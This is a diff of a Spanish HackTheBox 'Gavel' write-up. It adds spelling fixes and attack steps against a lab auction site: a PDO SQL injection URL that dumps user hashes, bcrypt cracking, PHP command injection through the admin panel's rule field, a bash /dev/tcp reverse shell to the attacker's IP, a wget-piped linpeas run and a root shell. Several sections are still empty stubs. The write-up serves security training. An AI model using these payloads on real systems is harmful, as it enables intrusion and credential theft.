@@ -13,6 +13,7 @@ categories:
   - Medium Machine
 tags:
   - Linux
+  - YAML
   - MySQL
   - Web Enumeration
   - Fuzzing
@@ -22,6 +23,8 @@ tags:
   - PDO SQL Injections
   - Cracking Hash
   - Cracking Bcrypt Hash
+  - Command Injection (CI)
+  - 
   - 
   - OSCP Style
 ---
@@ -61,8 +64,11 @@ Herramientas utilizadas:
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#SQLi">Aplicando PDO SQL Injections y Crackeando Hash Bcrypt</a></li>
+				<li><a href="#RCE">Aplicando Inyección de Comandos en Panel de Admin y Ganando Acceso a la Máquina Víctima</a></li>
+				<ul>
+					<li><a href="#"></a></li>
+				</ul>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
@@ -174,13 +180,13 @@ Nmap done: 1 IP address (1 host up) scanned in 20.89 seconds
 
 <br>
 
-El escaneo de la página web del **puerto 80**, nos indica que hay una redirección a un dominio al momento de visitarla.
+El escaneo de la página web del **puerto 80** nos indica que hay una redirección a un dominio al momento de visitarla.
 
 Registremos ese dominio en el `/etc/hosts`:
 ```bash
 echo "10.129.45.152 gavel.htb" >> /etc/hosts
 ```
-Visitemos la página para saber a que nos enfrentamos.
+Visitemos la página para saber a qué nos enfrentamos.
 
 
 <br>
@@ -200,7 +206,7 @@ Entremos:
 <img src="/assets/images/htb-writeup-gavel/Captura1.png">
 </p>
 
-Parece ser una página un poco extraña sobre compra de articulos curiosos.
+Parece ser una página un poco extraña sobre compra de artículos curiosos.
 
 Veamos qué nos dice **Wappalizer**:
 
@@ -228,19 +234,19 @@ Entra a la opción de crear un usuario y crea uno para entrar a la página web:
 
 Estamos dentro y del lado izquierdo tenemos dos páginas más.
 
-Si entramos a la opción **Bidding**, encontraremos varios articulos que parecen estar dentro de una subasta:
+Si entramos a la opción **Bidding**, encontraremos varios artículos que parecen estar dentro de una subasta:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-gavel/Captura6.png">
 </p>
 
-Debemos ofrecer la cantidad que viene indicada en el mensaje de cada articulo para poder comprarlo:
+Debemos ofrecer la cantidad que viene indicada en el mensaje de cada artículo para poder comprarlo:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-gavel/Captura7.png">
 </p>
 
-Una vez que pasa el tiempo para subastar, el articulo pasa a nuestro inventario, que podemos ver en la opción **Inventory**:
+Una vez que pasa el tiempo para subastar, el artículo pasa a nuestro inventario, que podemos ver en la opción **Inventory**:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-gavel/Captura8.png">
@@ -356,10 +362,10 @@ Encontramos algunos archivos como **admin.php**, pero lo más interesante es ver
 
 <h2 id="DumpGit">Dumpeando Repositorio de Git Expuesto y Analizando su Contenido</h2>
 
-Para dumpear el repositoio de **Git**, utilizaremos la siguiente herramienta:
+Para dumpear el repositorio de **Git**, utilizaremos la siguiente herramienta:
 * <a href="https://github.com/arthaud/git-dumper" target="_blank">Repositorio de arthaud: git-dumper</a>
  
-Una vez que lo descargues, instala los requerimientos y ya podras usar la herramienta:
+Una vez que lo descargues, instala los requerimientos y ya podrás usar la herramienta:
 ```bash
 pip install -r requirements.txt
 
@@ -368,7 +374,7 @@ usage: git-dumper [options] URL DIR
 git_dumper.py: error: the following arguments are required: URL, DIR
 ```
 
-Crea un directorio donde se guarde el repo e indicale a **git-dumper** que lo almacene ahí:
+Crea un directorio donde se guarde el repo e indícale a **git-dumper** que lo almacene ahí:
 ```bash
 mkdir gavel-git
 
@@ -387,7 +393,7 @@ Analicemos su contenido.
 
 <h3 id="inventory">Analizando Script inventory.php e Identificando Posibles Vulnerabilidades</h3>
 
-Dentro del contenido del repo, podemos analizar el siguiente script **inventory.php**, donde podemos ver como funciona:
+Dentro del contenido del repo, podemos analizar el siguiente script **inventory.php**, donde podemos ver cómo funciona:
 ```bash
 cat inventory.php
 <?php
@@ -452,12 +458,12 @@ $money = $stmt->fetchColumn();
 </body>
 </html>
 ```
-De manera general le ayuda al usuario para ordenar por **item_name** o **quantity**, y el script consulta la base de datos para obtener los ítems del usuario, junto con su metadata (descripción, imagen), y los renderiza en una vista **HTML**.
+De manera general, le ayuda al usuario para ordenar por **item_name** o **quantity**, y el script consulta la base de datos para obtener los ítems del usuario, junto con su metadata (descripción, imagen), y los renderiza en una vista **HTML**.
 
 Pero podemos visualizar algunas cosillas interesantes:
-* Para poder ver esta página, necesitamos estar logueados como un usuario, en caso de no estarlo, nos redirigira al `index.php`.
-* Tenemos dos parámetros, el primero es el de **user_id**, que encontramos en la variable `$userId = $_POST['user_id']...` y el segundo es **sort**, que encontramos en la variable `$sortItem = $_POST['sort']...`.
-* La siguiente linea puede ser vulnerable a SQLi, pues no valida el contenido que el usuario puede incluir:
+* Para poder ver esta página, necesitamos estar logueados como un usuario, en caso de no estarlo, nos redirigirá al `index.php`.
+* Tenemos dos parámetros; el primero es el de **user_id**, que encontramos en la variable `$userId = $_POST['user_id']...` y el segundo es **sort**, que encontramos en la variable `$sortItem = $_POST['sort']...`.
+* La siguiente línea puede ser vulnerable a SQLi, pues no valida el contenido que el usuario puede incluir:
 ```bash
 $col = "`" . str_replace("`", "", $sortItem) . "`";
 ```
@@ -544,70 +550,10 @@ $current_auction = $stmt->fetchAll(PDO::FETCH_ASSOC);
     <title>Auction Admin</title>
 ...
 ...
-            <h1 class="h3 text-gray-800 text-center"><i class="fa fa-lock"></i> Admin Panel</h1>
-            <hr>
-            <?php if (!empty($_SESSION['success'])): ?>
-                <div class="alert alert-success text-center">Rule and message updated successfully!</div>
-                <?php unset($_SESSION['success']); ?>
-            <?php endif; ?>
-            <?php if (!$current_auction): ?>
-                <div class="alert alert-warning">No active auctions at the moment. Please check back later.</div>
-            <?php else: ?>
-                <div class="row">
-                    <?php foreach ($current_auction as $auction):
-                        $itemDetails = get_item_by_name($auction['item_name']);
-                        $remaining = strtotime($auction['ends_at']) - time();
-                        ?>
-                        <div class="col-md-4">
-                            <div class="card shadow mb-4">
-                                <div class="card-body text-center">
-                                    <img src="<?= ASSETS_URL ?>/img/<?= $itemDetails['image'] ?>" alt="" class="img-fluid mb-3" style="max-height: 200px;">
-                                    <h3 class="mb-1"><?= htmlspecialchars($itemDetails['name']) ?></h3>
-                                    <p class="mb-1"><?= htmlspecialchars($itemDetails['description']) ?></p>
-                                    <hr>
-                                    <form class="bidForm mt-4" method="POST">
-                                    <input type="hidden" name="auction_id" value="<?= $auction['id'] ?>">
-                                    <!-- p class="mb-1 text-justify"><strong>Rule:</strong> <code lang="php"><?= htmlspecialchars($auction['rule']) ?></code></p -->
-                                    <input type="text" class="form-control form-control-user" name="rule" placeholder="Edit rule">
-                                    <!-- <p class="mb-1 text-justify"><strong>Message:</strong> <?= htmlspecialchars($auction['message']) ?></p> -->
-                                    <input type="text" class="form-control form-control-user" name="message" placeholder="Edit message">
-                                    <p class="mb-1 text-justify"><strong>Time Remaining:</strong> <span class="timer" data-end="<?= strtotime($auction['ends_at']) ?>"><?= $remaining ?></span> seconds <i class="fas fa-clock"></i></p>
-                                    <button class="btn btn-dark btn-user btn-block" type="submit"><i class="fas fa-pencil-alt"></i> Edit</button>
-                                    </form>
-                                </div>
-                            </div>
-                        </div>
-                    <?php endforeach; ?>
-                </div>
-            <?php endif; ?>
-        </div>
-    </div>
-
-    <!-- Scripts -->
-    <script src="<?= ASSETS_URL ?>/vendor/jquery/jquery.min.js"></script>
-    <script src="<?= ASSETS_URL ?>/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
-    <script src="<?= ASSETS_URL ?>/vendor/jquery-easing/jquery.easing.min.js"></script>
-    <script src="<?= ASSETS_URL ?>/js/sb-admin-2.min.js"></script>
-    <script>
-        document.querySelectorAll('.timer').forEach(timer => {
-            const end = parseInt(timer.dataset.end);
-            const pTag = timer.closest('p');
-            const interval = setInterval(() => {
-                const now = Math.floor(Date.now() / 1000);
-                const remaining = end - now;
-                if (remaining <= 0) {
-                    clearInterval(interval);
-                    location.reload();
-                } else {
-                    timer.innerText = remaining;
-                }
-            }, 1000);
-        });
-    </script>
 </body>
 </html>
 ```
-Esta página desplegada, permite cambiar la regla y mensaje de cualquier producto que se encuentre dentro de la subasta. Se realiza mediante un formulario al que solo tienen acceso los usuarios con el rol **auctioneer**, que son quienes pueden entrar al **panel de admin**.
+Esta página desplegada permite cambiar la regla y mensaje de cualquier producto que se encuentre dentro de la subasta. Se realiza mediante un formulario al que solo tienen acceso los usuarios con el rol **auctioneer**, que son quienes pueden entrar al **panel de admin**.
 
 Expliquemos lo más relevante que tiene este script:
 * Al inicio, vemos que hay un control de acceso en donde solo los usuarios con el rol **auctioneer**, pueden usar el panel admin. Lo curioso es que parece ser también un usuario y no solo un rol:
@@ -618,7 +564,7 @@ if (!isset($_SESSION['user']) || $_SESSION['user']['role'] !== 'auctioneer') {
 }
 ```
 
-* Vemos como se maneja el procesamiento del formulario, que solo se ejecuta si se envia por **petición POST**.
+* Vemos cómo se maneja el procesamiento del formulario, que solo se ejecuta si se envía por **petición POST**.
 * Observa que se obtienen 3 valores, siendo 2 de estos los que el usuario puede modificar, que son **rule** y **message**:
 ```bash
 $auction_id = intval($_POST['auction_id'] ?? 0);
@@ -656,24 +602,54 @@ Leyendo el blog, nos menciona que es posible aplicar **SQLi** a **PDO (PHP Data 
 ```bash
 http://localhost:8000/?name=x` FROM (SELECT table_name AS `'x` from information_schema.tables)y;%23&col=\?%23%00
 ```
-Esta ocupando filtros para aplicar bypass a las restricciones que están activas en la página **inventory.php**.
+Expliquemos la inyección:
+* La inyección comienza con un backtick que cierra el nombre del identificador que el backend está construyendo.
+* Construye una subconsulta que devuelve nombres de tablas del esquema.
+* Usa `AS 'x` para definir una columna con un nombre controlado.
+* Por último, tenemos lo siguiente en el segundo parámetro:
+	* El `\?` forza a que el backend reciba algo como columna para escapar el contexto.
+	* El `%23` es un comentario URL encodeado del símbolo `#`.
+	* El `%00` es un **Null byte** URL encodeado, siendo originalmente `\x00`.
 
-Utilicemos la misma inyección, pero cambiemos los parámetros:
+En resumen, está ocupando filtros para aplicar bypass a las restricciones que están activas en la página **inventory.php**.
+
+Utilicemos la misma inyección y modifiquémosla para que tenga los mismos parámetros, quedando de esta forma:
+```bash
+http://gavel.htb/inventory.php?user_id=x` FROM (SELECT table_name AS `'x` from information_schema.tables)y;%23--&sort=\?%23%00--
+```
+
+Pruébala:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-gavel/Captura9.png">
 </p>
 
+Excelente, podemos ver todas las tablas de la base de datos y observa que podemos ver la tabla **users**.
 
-
+Utiliza la siguiente inyección para ver los usuarios y contraseñas de esa tabla:
 ```bash
-
+http://gavel.htb/inventory.php?user_id=x` FROM (SELECT CONCAT(username,0x3a,password) AS `'x` FROM users)y;%23--&sort=%5C?%23%00--
 ```
 
+Pruébala:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-gavel/Captura10.png">
+</p>
+
+Genial, tenemos el hash de la contraseña del **usuario auctioneer**.
+
+Identifiquemos el tipo de Hash:
 ```bash
-
+hashid '$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS'
+Analyzing '$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS'
+[+] Blowfish(OpenBSD) 
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt
 ```
+Parece ser más un Hash en formato **bcrypt**.
 
+Guárdalo dentro de un archivo y crackéalo con **JohnTheRipper**:
 ```bash
 john -w:/usr/share/wordlists/rockyou.txt hash
 Using default input encoding: UTF-8
@@ -681,51 +657,118 @@ Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
 Cost 1 (iteration count) is 1024 for all loaded hashes
 Will run 6 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-midnight1        (?)     
+**********        (?)     
 1g 0:00:00:27 DONE (2025-12-02 19:07) 0.03698g/s 113.8p/s 113.8c/s 113.8C/s iamcool..milena
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
+Tenemos la contraseña.
+
+Probémosla:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-gavel/Captura11.png">
+</p>
+
+Muy bien, somos el **usuario auctioneer** y podemos ver el panel **admin**.
 
 <br>
 
-<h2 id="RCE"></h2>
+<h2 id="RCE">Aplicando Inyección de Comandos en Panel de Admin y Ganando Acceso a la Máquina Víctima</h2>
+
 
 ```bash
+cat gavel-git/rules/default.yaml
+rules:
+  - rule: "return $current_bid >= $previous_bid * 1.1;"
+    message: "Bid at least 10% more than the current price."
 
+  - rule: "return $current_bid % 5 == 0;"
+    message: "Bids must be in multiples of 5. Your account balance must cover the bid amount."
+
+  - rule: "return $current_bid >= $previous_bid + 5000;"
+    message: "Only bids greater than 5000 + current bid will be considered. Ensure you have sufficient balance before placing such bids."
 ```
 
 ```bash
-
+return system('whoami');
 ```
 
 ```bash
-
+tcpdump -i tun0 icmp -n
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 ```
 
 ```bash
+return system('ping Tu_IP');
+```
 
+```bash
+tcpdump -i tun0 icmp -n
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+00:38:01.929903 IP 10.10.11.97 > Tu_IP: ICMP echo request, id 1, seq 1, length 64
+00:38:01.929927 IP Tu_IP > 10.10.11.97: ICMP echo reply, id 1, seq 1, length 64
+00:38:02.931408 IP 10.10.11.97 > Tu_IP: ICMP echo request, id 1, seq 2, length 64
+...
+40 packets captured
+40 packets received by filter
+0 packets dropped by kernel
+```
+
+```bash
+nc -nlvp 4444
+listening on [any] 4444 ...
+```
+
+```bash
+return system('bash -c "bash -i >& /dev/tcp/Tu_IP/443 0>&1"');
+```
+
+```bash
+nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [Tu_IP] from (UNKNOWN) [10.10.11.97] 59712
+bash: cannot set terminal process group (996): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@gavel:/var/www/html/gavel/includes$ whoami
+whoami
+www-data
 ```
 
 <br>
 
-<h2 id=""></h2>
+<h3 id=""></h3>
 
 ```bash
-
+www-data@gavel:/var/www/html/gavel/includes$ cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+auctioneer:x:1001:1002::/home/auctioneer:/bin/bash
 ```
 
 ```bash
-
+www-data@gavel:/var/www/html/gavel/includes$ ls -la /home
+total 12
+drwxr-xr-x  3 root       root       4096 Nov  5 12:46 .
+drwxr-xr-x 19 root       root       4096 Nov  5 12:46 ..
+drwxr-x---  2 auctioneer auctioneer 4096 Dec  6 04:00 auctioneer
 ```
 
 ```bash
-
+www-data@gavel:/home$ su auctioneer
+Password: 
+auctioneer@gavel:/home$ 
 ```
 
 ```bash
-
+auctioneer@gavel:/home$ cd auctioneer/
+auctioneer@gavel:~$ ls
+user.txt
+auctioneer@gavel:~$ cat user.txt
+...
 ```
+
 
 
 
@@ -741,7 +784,78 @@ Session completed.
 <h2 id=""></h2>
 
 ```bash
+auctioneer@gavel:~$ sudo -l
+[sudo] password for auctioneer: 
+Sorry, user auctioneer may not run sudo on gavel.
+```
 
+```bash
+auctioneer@gavel:~$ id
+uid=1001(auctioneer) gid=1002(auctioneer) groups=1002(auctioneer),1001(gavel-seller)
+```
+
+```bash
+auctioneer@gavel:~$ ls -la /opt
+total 12
+drwxr-xr-x  3 root root 4096 Nov  5 12:46 .
+drwxr-xr-x 19 root root 4096 Nov  5 12:46 ..
+drwxr-xr-x  4 root root 4096 Nov  5 12:46 gavel
+```
+
+```bash
+auctioneer@gavel:~$ ls -la /opt/gavel/
+total 56
+drwxr-xr-x 4 root root  4096 Nov  5 12:46 .
+drwxr-xr-x 3 root root  4096 Nov  5 12:46 ..
+drwxr-xr-x 3 root root  4096 Nov  5 12:46 .config
+-rwxr-xr-- 1 root root 35992 Oct  3 19:35 gaveld
+-rw-r--r-- 1 root root   364 Sep 20 14:54 sample.yaml
+drwxr-x--- 2 root root  4096 Dec  6 04:00 submission
+```
+
+```bash
+auctioneer@gavel:~$ cat /opt/gavel/sample.yaml 
+---
+item:
+  name: "Dragon's Feathered Hat"
+  description: "A flamboyant hat rumored to make dragons jealous."
+  image: "https://example.com/dragon_hat.png"
+  price: 10000
+  rule_msg: "Your bid must be at least 20% higher than the previous bid and sado isn't allowed to buy this item."
+  rule: "return ($current_bid >= $previous_bid * 1.2) && ($bidder != 'sado');"
+```
+
+```bash
+auctioneer@gavel:/opt/gavel$ file gaveld 
+gaveld: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3b8b1b784b45ddabaf9ca56b06b62d4f59f68a0d, for GNU/Linux 3.2.0, not stripped
+```
+
+```bash
+auctioneer@gavel:/opt/gavel$ cat .config/php/php.ini 
+engine=On
+display_errors=On
+open_basedir=/
+disable_functions=
+```
+
+```bash
+auctioneer@gavel:/opt/gavel$ wget -qO- http://Tu_IP/linpeas.sh | bash
+...
+╔══════════╣ Executable files potentially added by user (limit 70)
+2025-12-06+05:46:00.2392933730 /var/www/html/gavel/includes/auction_watcher.php
+...
+2025-10-03+19:35:58.6240656280 /usr/local/bin/gavel-util
+...
+...
+```
+
+```bash
+auctioneer@gavel:~$ gavel-util 
+Usage: gavel-util <cmd> [options]
+Commands:
+  submit <file>           Submit new items (YAML format)
+  stats                   Show Auction stats
+  invoice                 Request invoice
 ```
 
 ```bash
@@ -756,6 +870,19 @@ Session completed.
 
 ```
 
+```bash
+auctioneer@gavel:~$ /opt/gavel/rootbash -p
+rootbash-5.1# whoami
+root
+```
+
+```bash
+rootbash-5.1# cd /root
+rootbash-5.1# ls
+root.txt  scripts
+rootbash-5.1# cat root.txt
+...
+```
 
 
 <br>
@@ -765,10 +892,14 @@ Session completed.
 </div>
 
 
-links
+* https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/
+* 
+* 
+* 
 
 
 <br>
+
 # FIN
 
 <footer id="myFooter">
